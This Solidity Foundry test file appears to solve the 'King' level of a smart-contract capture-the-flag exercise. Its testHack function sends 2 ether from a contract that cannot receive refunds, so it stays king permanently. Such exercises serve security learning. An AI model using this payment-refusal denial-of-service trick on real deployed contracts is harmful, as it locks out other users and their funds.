pragma solidity ^0.8.0;

import 'forge-std/Test.sol';
import 'levels/KingFactory.sol';
import 'utils/TestUtils.sol';

contract KingTest is Test {
  address player;
  Utils utils;
  KingFactory kingFactory;
  address payable kingAddress;

  function setUp() public {
    utils = new Utils();
    player = utils.createUsers(1)[0];
    kingFactory = new KingFactory();
    kingAddress = payable(kingFactory.createInstance{value: 1 ether}(player)); // set initial prize at 1 eth
  }

  function testHack() public {
    kingAddress.call{value: 2 ether}('');
    assertTrue(kingFactory.validateInstance(kingAddress, player), 'Level not solved');
  }
}
